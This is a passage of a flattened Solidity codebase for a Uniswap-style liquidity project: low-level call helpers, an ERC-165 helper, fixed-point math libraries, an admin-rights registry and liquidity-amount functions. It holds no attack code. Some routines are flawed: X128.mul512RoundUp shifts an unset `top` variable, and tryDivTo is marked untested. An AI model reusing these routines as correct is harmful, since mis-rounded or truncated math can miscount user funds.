     * up by this function (like regular Solidity function calls). However, if
     * the call reverted with no returned reason, this function reverts with a
     * {Errors.FailedCall} error.
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        if (address(this).balance < value) {
            revert Errors.InsufficientBalance(address(this).balance, value);
        }
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and reverts if the target
     * was not a contract or bubbling up the revert reason (falling back to {Errors.FailedCall}) in case
     * of an unsuccessful call.
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata
    ) internal view returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            // only check if target is a contract if the call was successful and the return data is empty
            // otherwise we already know that it was a contract
            if (returndata.length == 0 && target.code.length == 0) {
                revert AddressEmptyCode(target);
            }
            return returndata;
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and reverts if it wasn't, either by bubbling the
     * revert reason or with a default {Errors.FailedCall} error.
     */
    function verifyCallResult(bool success, bytes memory returndata) internal pure returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            return returndata;
        }
    }

    /**
     * @dev Reverts with returndata if present. Otherwise reverts with {Errors.FailedCall}.
     */
    function _revert(bytes memory returndata) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            assembly ("memory-safe") {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert Errors.FailedCall();
        }
    }
}

// lib/Commons/src/ERC/Auto165.sol

// Copyright 2023 Itos Inc.

// A contract can comply with ERC165 by simply inheriting this contract.
// Any other contracts it inherits from can indicate the supported interfaces
// by calling Auto165Lib.addSupport in their constructor and it'll automatically
// be incorporated into the supportsInterface call.
contract Auto165 is IERC165_0 {
    // The following is just an example.
    // Rarely does anyone need to indicate they support ERC165 by first supporting 165.
    // That's... useless...
    // constructor() {
    //     // This is how a parent contract automatically adds their support indication
    //     // to all child contracts.
    //     Auto165Lib.addSupport(type(IERC165).interfaceId);
    // }

    /// @inheritdoc IERC165_0
    function supportsInterface(bytes4 interfaceId) external view virtual returns (bool) {
        return Auto165Lib.contains(interfaceId);
    }
}

library Auto165Lib {
    bytes32 public constant AUTO165_STORAGE_POSITION = keccak256("itos.auto165.diamond.storage");

    function interfaceStore() internal pure returns (mapping(bytes4 => bool) storage interfaces) {
        bytes32 position = AUTO165_STORAGE_POSITION;
        assembly {
            interfaces.slot := position
        }
    }

    /// Indicate this contract supports the given type({}).interfaceId
    function addSupport(bytes4 interfaceId) internal {
        mapping(bytes4 => bool) storage interfaces = interfaceStore();
        interfaces[interfaceId] = true;
    }

    /// Determine if the diamond storage of interfaces contains the given id.
    function contains(bytes4 interfaceId) internal view returns (bool) {
        mapping(bytes4 => bool) storage interfaces = interfaceStore();
        return interfaces[interfaceId];
    }
}

// lib/openzeppelin-contracts/contracts/interfaces/IERC165.sol

// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/IERC165.sol)

// lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol

// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/IERC20.sol)

// lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol

// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/IERC20Metadata.sol)

/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20_1 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// src/TransferHelper.sol

// Copied from https://github.com/Uniswap/v3-periphery

library TransferHelper {
    /// @notice Transfers tokens from the targeted address to the given destination
    /// @notice Errors with 'STF' if transfer fails
    /// @param token The contract address of the token to be transferred
    /// @param from The originating address from which the tokens will be transferred
    /// @param to The destination address of the transfer
    /// @param value The amount to be transferred
    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(
                IERC20_0.transferFrom.selector,
                from,
                to,
                value
            )
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "STF"
        );
    }

    /// @notice Transfers tokens from msg.sender to a recipient
    /// @dev Errors with ST if transfer fails
    /// @param token The contract address of the token which will be transferred
    /// @param to The recipient of the transfer
    /// @param value The value of the transfer
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20_0.transfer.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "ST"
        );
    }

    /// @notice Approves the stipulated contract to spend the given allowance in the given token
    /// @dev Errors with 'SA' if transfer fails
    /// @param token The contract address of the token to be approved
    /// @param to The target of the approval
    /// @param value The amount of the given token the target will be allowed to spend
    function safeApprove(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20_0.approve.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "SA"
        );
    }

    /// @notice Transfers ETH to the recipient address
    /// @dev Fails with `STE`
    /// @param to The destination of the transfer
    /// @param value The value to be transferred
    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "STE");
    }
}

// lib/Commons/src/Math/Ops.sol

library X32 {
    /// The two numbers are too large to fit the result into one uint256.
    error OversizedX32(uint256 a, uint256 b);

    uint256 public constant SHIFT = 1 << 32;

    // Multiply two 256 bit numbers to a 512 number, but one of the 256's is X32.
    function mul512(uint256 a, uint256 b) internal pure returns (uint256 bot, uint256 top) {
        (uint256 rawB, uint256 rawT) = FullMath_0.mul512(a, b);
        bot = (rawB >> 32) + (rawT << 224);
        top = rawT >> 32;
    }

    /// Multiply two numbers and reduce by 2^32. The result must fit in a 256 bit or it'll error.
    function mul256(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            res := add(add(shr(32, bot), shl(224, top)), and(roundUp, gt(mod(bot, modmax), 0)))
        }
    }
}

library X64 {
    /// The two numbers are too large to fit the result into one uint256.
    error OversizedX64(uint256 a, uint256 b);

    uint256 public constant SHIFT = 1 << 64;

    /// Multiply two 256 numbers with X64 precision with your desired rounding.
    /// @dev The result must fit in 256 bits or will give an incorrect answer.
    function mul256(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            res := add(add(shr(64, bot), shl(192, top)), and(roundUp, gt(mod(bot, modmax), 0)))
        }
    }

    // Multiply two 256 bit numbers to a 512 number, but one of the 256's is X32.
    function mul512(uint256 a, uint256 b) internal pure returns (uint256 bot, uint256 top) {
        (uint256 rawB, uint256 rawT) = FullMath_0.mul512(a, b);
        bot = (rawB >> 64) + (rawT << 192);
        top = rawT >> 64;
    }

    /// Multiply and round down after reducing by 2^64. Error if the result is too large.
    function safeMul512(uint256 a, uint256 b) internal pure returns (uint256 res) {
        uint256 top;
        (res, top) = mul512(a, b);
        if (top > 0) revert OversizedX64(a, b);
    }
}

/**
 * @notice Utility for Q64.96 operations
 *
 */
library Q64X96 {
    uint256 constant PRECISION = 96;

    uint256 constant SHIFT = 1 << 96;

    error Q64X96Overflow(uint160 a, uint256 b);

    /// Multiply an X96 precision number by an arbitrary uint256 number.
    /// Returns with the same precision as b.
    /// The result takes up 256 bits. Will error on overflow.
    function mul(uint160 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        if ((top >> 96) > 0) {
            revert Q64X96Overflow(a, b);
        }
        assembly {
            res := add(shr(96, bot), shl(160, top))
        }
        if (roundUp && (bot % SHIFT > 0)) {
            res += 1;
        }
    }

    /// Same as the regular mul but without checking for overflow
    function unsafeMul(uint160 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        assembly {
            res := add(shr(96, bot), shl(160, top))
        }
        if (roundUp) {
            uint256 modby = SHIFT;
            assembly {
                res := add(res, gt(mod(bot, modby), 0))
            }
        }
    }

    /// Divide a uint160 by a Q64X96 number.
    /// Returns with the same precision as num.
    /// @dev uint160 is chosen because once the 96 bits of precision are cancelled out,
    /// the result is at most 256 bits.
    function div(uint160 num, uint160 denom, bool roundUp) internal pure returns (uint256 res) {
        uint256 fullNum = uint256(num) << PRECISION;
        res = fullNum / denom;
        if (roundUp) {
            assembly {
                res := add(res, gt(fullNum, mul(res, denom)))
            }
        }
    }
}

library X96 {
    uint256 constant PRECISION = 96;
    uint256 constant SHIFT = 1 << 96;

    /// Multiply two 256 numbers with X96 precision with your desired rounding.
    /// @dev The result must fit in 256 bits or will silently give an incorrect answer.
    function mul256(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            res := add(add(shr(96, bot), shl(160, top)), and(roundUp, gt(mod(bot, modmax), 0)))
        }
    }
}

library X128 {
    /// The two numbers are too large to fit the result into one uint256.
    error Oversized(uint256 a, uint256 b);

    uint256 constant PRECISION = 128;

    uint256 constant SHIFT = 1 << 128;

    /// Multiply a 256 bit number by a 128 bit number. Either of which is X128.
    /// @dev This rounds results down.
    function mul256(uint128 a, uint256 b) internal pure returns (uint256) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        unchecked {
            return (bot >> 128) + (top << 128);
        }
    }

    /// Multiply a 256 bit number by a 128 bit number. Either of which is X128.
    /// @dev This rounds results up.
    function mul256RoundUp(uint128 a, uint256 b) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            res := add(add(shr(128, bot), shl(128, top)), gt(mod(bot, modmax), 0))
        }
    }

    /// Multiply two 256 numbers with X128 precision with your desired rounding.
    /// @dev The result must fit in 256 bits or will silently give an incorrect answer.
    function mul256(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            res := add(add(shr(128, bot), shl(128, top)), and(roundUp, gt(mod(bot, modmax), 0)))
        }
    }

    /// Multiply a 256 bit number by a 256 bit number, either of which is X128, to get 384 bits.
    /// @dev This rounds results down.
    /// @return bot The bottom 256 bits of the result.
    /// @return top The top 128 bits of the result.
    function mul512(uint256 a, uint256 b) internal pure returns (uint256 bot, uint256 top) {
        (uint256 _bot, uint256 _top) = FullMath_0.mul512(a, b);
        unchecked {
            bot = (_bot >> 128) + (_top << 128);
            top = _top >> 128;
        }
    }

    /// Multiply a 256 bit number by a 256 bit number, either of which is X128, to get 384 bits.
    /// @dev This rounds results up.
    /// @return bot The bottom 256 bits of the result.
    /// @return top The top 128 bits of the result.
    function mul512RoundUp(uint256 a, uint256 b) internal pure returns (uint256 bot, uint256 top) {
        (uint256 _bot, uint256 _top) = FullMath_0.mul512(a, b);
        uint256 modmax = SHIFT;
        assembly {
            bot := add(add(shr(128, _bot), shl(128, top)), gt(mod(_bot, modmax), 0))
            top := shr(128, _top)
        }
    }

    /// mul512 but error if oversized.
    function safeMul512(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = roundUp ? mul512RoundUp(a, b) : mul512(a, b);
        if (top > 0) revert Oversized(a, b);
        return bot;
    }

    /// Divide two numbers to get an X128 result.
    /// @dev Will error on overflow.
    /// Unlike full math, this gives an approximate answer that may be off by 2/128th of the result.
    /// In return, the common case costs ~40 gas and at most this costs ~300 gas.
    function divTo(uint256 a, uint256 b) internal pure returns (uint256 resX128) {
        bool rev;
        (resX128, rev) = tryDivTo(a, b);
        if (rev) revert Oversized(a, b);
    }

    /// Attempt to divide a by b to get an X128 result. If the result is too large 0 and true is returned.
    /// @dev TODO: untested
    /// @dev This rounds down.
    function tryDivTo(uint256 a, uint256 b) internal pure returns (uint256 resX128, bool overFlow) {
        uint256 whole = a / b; // Whole result
        // Can't fit in Q128X128
        if (whole >= SHIFT) return (0, true);
        uint256 residual;
        unchecked {
            // Q128 part
            resX128 = whole << 128;
            // X128 part
            residual = a % b;
        }
        // If the residual is small we can go ahead with regular division.
        if (residual < SHIFT) {
            // The common case
            unchecked {
                resX128 += (residual << 128) / b;
            }
            return (resX128, false);
        }
        // If the residual is too large, we try to shift up by as much as we can while still fitting into 256 bit arithmetic.
        uint8 rMSB = MathUtils.msb(residual); // Could save 9 gas by making a tailored one for just the relevant 128 bits.
        /// Residual greather or equal to SHIFT means rMSB >= 128.
        uint8 shiftUp;
        uint8 shiftDown;
        unchecked {
            shiftUp = 255 - rMSB;
            shiftDown = 128 - shiftUp;
        }
        // These two shifts combine to add the X128 bits.
        // TODO: Handle rounding up
        uint256 denom = b >> shiftDown;
        if (b % (1 << shiftDown) > 0) {
            denom += 1;
        }
        resX128 += (residual << shiftUp) / denom;
    }
}

library X256 {
    /// Multiply a 256 bit number by a 256 bit number and div by 2^256.
    /// @custom:gas 212
    function mul256(uint256 a, uint256 b, bool roundUp) internal pure returns (uint256) {
        (uint256 bot, uint256 top) = FullMath_0.mul512(a, b);
        assembly {
            top := add(top, and(roundUp, gt(bot, 0)))
        }
        return top;
    }
}

/// Convenience library for interacting with Uint128s by other types.
library U128Ops {
    function add(uint128 self, int128 other) public pure returns (uint128) {
        if (other >= 0) {
            return self + uint128(other);
        } else {
            return self - uint128(-other);
        }
    }

    function sub(uint128 self, int128 other) public pure returns (uint128) {
        if (other >= 0) {
            return self - uint128(other);
        } else {
            return self + uint128(-other);
        }
    }
}

library U256Ops {
    function add(uint256 self, int256 other) public pure returns (uint256) {
        if (other >= 0) {
            return self + uint256(other);
        } else {
            return self - uint256(-other);
        }
    }

    function sub(uint256 self, uint256 other) public pure returns (int256) {
        if (other >= self) {
            uint256 temp = other - self;
            // Yes technically the max should be -type(int256).max but that's annoying to
            // get right and cheap for basically no benefit.
            require(temp <= uint256(type(int256).max));
            return -int256(temp);
        } else {
            uint256 temp = self - other;
            require(temp <= uint256(type(int256).max));
            return int256(temp);
        }
    }
}

// lib/Commons/src/Util/Admin.sol

/**
 * @title Administrative Library
 * @author Terence An
 * @notice This contains an administrative utility that uses diamond storage.
 * This is used to add and remove administrative privileges from addresses.
 * It also has validation functions for those privileges.
 * It adheres to ERC-173 which establishes an owernship standard.
 * @dev Administrative right assignments should be time-gated and veto-able for modern
 * contracts.
 *
 */

/// These are flags that can be joined so each is assigned its own hot bit.
/// @dev These flags get the very top bits so that user specific flags are given the lower bits.
library AdminFlags {
    uint256 public constant NULL = 0; // No clearance at all. Default value.
    uint256 public constant OWNER = 0x8000000000000000000000000000000000000000000000000000000000000000;
    uint256 public constant VETO = 0x4000000000000000000000000000000000000000000000000000000000000000;
}

struct AdminRegistry {
    // The owner actually does not have any rights except the ability to assign rights to users.
    // Of course it can assign rights to itself.
    // Thus it is probably desireable to qualify this ability, for example by time-gating it.
    address owner;
    // The owner can reassign ownership to a new address. This new address here must accept ownership
    // before it is actually transferred to avoid incorrect reassignemnts.
    address pendingOwner;
    // Rights are one hot encodings of permissions granted to users.
    // Each right should be a single bit in the uint256.
    mapping(address => uint256) rights;
}

/// Utility functions for checking, registering, and deregisterying administrative credentials
/// in a Diamond storage context. Most contracts that need this level of security sophistication
/// are probably large enough to required diamond storage.
library AdminLib {
    bytes32 constant ADMIN_STORAGE_POSITION = keccak256("v4.admin.diamond.storage");

    error NotOwner();
    error InsufficientCredentials(address caller, uint256 expectedRights, uint256 actualRights);
    error CannotReinitializeOwner(address existingOwner);
    error ImproperOwnershipAcceptance();

    event AdminAdded(address admin, uint256 newRight, uint256 existing);
    event AdminRemoved(address admin, uint256 removedRight, uint256 existing);

    function adminStore() internal pure returns (AdminRegistry storage adReg) {
        bytes32 position = ADMIN_STORAGE_POSITION;
        assembly {
            adReg.slot := position
        }
    }

    /* Getters */

    function getOwner() external view returns (address) {
        return adminStore().owner;
    }

    // @return lvl Will be cast to uint8 on return to external contracts.
    function getAdminRights(address addr) external view returns (uint256 rights) {
        return adminStore().rights[addr];
    }

    /* Validating Helpers */

    function validateOwner() internal view {
        if (msg.sender != adminStore().owner) {
            revert NotOwner();
        }
    }

    /// Revert if the msg.sender does not have the expected right.
    function validateRights(uint256 expected) internal view {
        AdminRegistry storage adReg = adminStore();
        uint256 actual = adReg.rights[msg.sender];
        if (actual & expected != expected) {
            revert InsufficientCredentials(msg.sender, expected, actual);
        }
    }

    /// Revert if the target does not have the expected right.
    function validateRights(address target, uint256 expected) internal view {
        AdminRegistry storage adReg = adminStore();
        uint256 actual = adReg.rights[target];
        if (actual & expected != expected) {
            revert InsufficientCredentials(msg.sender, expected, actual);
        }
    }

    /* Registry functions */

    /// Called when there is no owner so one can be set for the first time.
    function initOwner(address owner) internal {
        AdminRegistry storage adReg = adminStore();
        if (adReg.owner != address(0)) {
            revert CannotReinitializeOwner(adReg.owner);
        }
        adReg.owner = owner;
    }

    /// @notice Move ownership to another addres. The new owner is not immediately assigned
    /// and must confirm validity by accepting the ownership.
    /// @dev Remember to initialize the owner to a contract that can reassign on construction.
    function reassignOwner(address newOwner) internal {
        validateOwner();
        adminStore().pendingOwner = newOwner;
    }

    /// Once ownership has been reassigned to a new address, the new address must make a call to
    /// explicitly acceptance ownership. This avoids problems that can arise from incorrect reassignments.
    function acceptOwnership() internal {
        AdminRegistry storage adReg = adminStore();
        if (adReg.pendingOwner != msg.sender) {
            revert ImproperOwnershipAcceptance();
        }
        adReg.owner = msg.sender;
        adReg.pendingOwner = address(0);
    }

    /// Add a right to an address
    /// @dev When actually using, the importing function should add restrictions to this.
    function register(address admin, uint256 right) internal {
        AdminRegistry storage adReg = adminStore();
        uint256 existing = adReg.rights[admin];
        adReg.rights[admin] = existing | right;
        emit AdminAdded(admin, right, existing);
    }

    /// Remove a right from an address.
    /// @dev When using, the wrapper function should add restrictions.
    function deregister(address admin, uint256 right) internal {
        AdminRegistry storage adReg = adminStore();
        uint256 existing = adReg.rights[admin];
        adReg.rights[admin] = existing & (~right);
        emit AdminRemoved(admin, right, existing);
    }
}

/// Base class for an admin facet with external interactions with the AdminLib
contract BaseAdminFacet is IERC173 {
    constructor() {
        // ERC173 complies with 165.
        Auto165Lib.addSupport(type(IERC173).interfaceId);
    }

    function transferOwnership(address _newOwner) external override {
        AdminLib.reassignOwner(_newOwner);
    }

    function owner() external view override returns (address owner_) {
        owner_ = AdminLib.getOwner();
    }

    /// The pending owner can accept their ownership rights.
    function acceptOwnership() external {
        emit IERC173.OwnershipTransferred(AdminLib.getOwner(), msg.sender);
        AdminLib.acceptOwnership();
    }

    /// Fetch the admin level for an address.
    function adminRights(address addr) external view returns (uint256 rights) {
        return AdminLib.getAdminRights(addr);
    }
}

// src/single/integrations/uniswap/LiquidityAmounts.sol

/// @title Liquidity amount functions
/// @notice Provides functions for computing liquidity amounts from token amounts and prices
library LiquidityAmounts {
    /// @notice Downcasts uint256 to uint128
    /// @param x The uint258 to be downcasted
    /// @return y The passed value, downcasted to uint128
    function toUint128(uint256 x) private pure returns (uint128 y) {
        require((y = uint128(x)) == x);
    }

    /// @notice Computes the amount of liquidity received for a given amount of token0 and price range
    /// @dev Calculates amount0 * (sqrt(upper) * sqrt(lower)) / (sqrt(upper) - sqrt(lower))
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param amount0 The amount0 being sent in
    /// @return liquidity The amount of returned liquidity
    function getLiquidityForAmount0(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint256 amount0
    ) internal pure returns (uint128 liquidity) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);
        uint256 intermediate = FullMath_1.mulDiv(
            sqrtRatioAX96,
            sqrtRatioBX96,
            FixedPoint96.Q96
        );
        return
            toUint128(
                FullMath_1.mulDiv(
                    amount0,
                    intermediate,
                    sqrtRatioBX96 - sqrtRatioAX96
                )
            );
    }

    /// @notice Computes the amount of liquidity received for a given amount of token1 and price range
    /// @dev Calculates amount1 / (sqrt(upper) - sqrt(lower)).
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param amount1 The amount1 being sent in
    /// @return liquidity The amount of returned liquidity
    function getLiquidityForAmount1(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint256 amount1
    ) internal pure returns (uint128 liquidity) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);
        return
            toUint128(
                FullMath_1.mulDiv(
                    amount1,
                    FixedPoint96.Q96,
                    sqrtRatioBX96 - sqrtRatioAX96
                )
            );
    }

    /// @notice Computes the maximum amount of liquidity received for a given amount of token0, token1, the current
    /// pool prices and the prices at the tick boundaries
    /// @param sqrtRatioX96 A sqrt price representing the current pool prices
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param amount0 The amount of token0 being sent in
    /// @param amount1 The amount of token1 being sent in
    /// @return liquidity The maximum amount of liquidity received
    function getLiquidityForAmounts(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint256 amount0,
        uint256 amount1
    ) internal pure returns (uint128 liquidity) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        if (sqrtRatioX96 <= sqrtRatioAX96) {
            liquidity = getLiquidityForAmount0(
                sqrtRatioAX96,
                sqrtRatioBX96,
                amount0
            );
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            uint128 liquidity0 = getLiquidityForAmount0(
                sqrtRatioX96,
                sqrtRatioBX96,
                amount0
            );
            uint128 liquidity1 = getLiquidityForAmount1(
                sqrtRatioAX96,
                sqrtRatioX96,
                amount1
            );

            liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
        } else {
            liquidity = getLiquidityForAmount1(
                sqrtRatioAX96,
                sqrtRatioBX96,
                amount1
            );
        }
    }

    /// @notice overloaded variant of the get amount for liquidity
    function getAmountsForLiquidity(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity,
        bool roundUp
    ) internal pure returns (uint256 amount0, uint256 amount1) {
        if (roundUp) {
            return
                getAmountsForLiquidityRoundingUp(
                    sqrtRatioX96,
                    sqrtRatioAX96,
                    sqrtRatioBX96,
                    liquidity
                );
        }
        return
            getAmountsForLiquidity(
                sqrtRatioX96,
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
    }

    /// @notice Computes the amount of token0 for a given amount of liquidity and a price range
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    /// @return amount0 The amount of token0
    function getAmount0ForLiquidity(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        return
            FullMath_1.mulDiv(
                uint256(liquidity) << FixedPoint96.RESOLUTION,
                sqrtRatioBX96 - sqrtRatioAX96,
                sqrtRatioBX96
            ) / sqrtRatioAX96;
    }

    /// @notice Computes the amount of token1 for a given amount of liquidity and a price range
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    /// @return amount1 The amount of token1
    function getAmount1ForLiquidity(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        return
            FullMath_1.mulDiv(
                liquidity,
                sqrtRatioBX96 - sqrtRatioAX96,
                FixedPoint96.Q96
            );
    }

    /// @notice Computes the token0 and token1 value for a given amount of liquidity, the current
    /// pool prices and the prices at the tick boundaries
    /// @param sqrtRatioX96 A sqrt price representing the current pool prices
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    /// @return amount0 The amount of token0
    /// @return amount1 The amount of token1
    function getAmountsForLiquidity(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0, uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        if (sqrtRatioX96 <= sqrtRatioAX96) {
            amount0 = getAmount0ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            amount0 = getAmount0ForLiquidity(
                sqrtRatioX96,
                sqrtRatioBX96,
                liquidity
            );
            amount1 = getAmount1ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioX96,
                liquidity
            );
        } else {
            amount1 = getAmount1ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        }
    }

    /// note these function round the amount up to be used as the expected amount requested in the
    /// uniswap mint callback
    /// @notice Computes the requested amount to mint a position for a given amount of liquidity
    /// and a price range
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    function getAmount0ForLiquidityRoundingUp(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        return
            UnsafeMath.divRoundingUp(
                FullMath_1.mulDivRoundingUp(
                    uint256(liquidity) << FixedPoint96.RESOLUTION,
                    sqrtRatioBX96 - sqrtRatioAX96,
                    sqrtRatioBX96
                ),
                sqrtRatioAX96
            );
    }

    /// @notice Computes the requested amount to mint a position for a given amount of liquidity and a price range
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    /// @return amount1 The amount of token1
    function getAmount1ForLiquidityRoundingUp(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        return
            FullMath_1.mulDivRoundingUp(
                liquidity,
                sqrtRatioBX96 - sqrtRatioAX96,
                FixedPoint96.Q96
            );
    }

    /// @notice Computes the token0 and token1 requested for a given amount of liquidity, the current
    /// pool prices and the prices at the tick boundaries
    /// @param sqrtRatioX96 A sqrt price representing the current pool prices
    /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary
    /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary
    /// @param liquidity The liquidity being valued
    /// @return amount0 The amount of token0
    /// @return amount1 The amount of token1
    function getAmountsForLiquidityRoundingUp(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0, uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

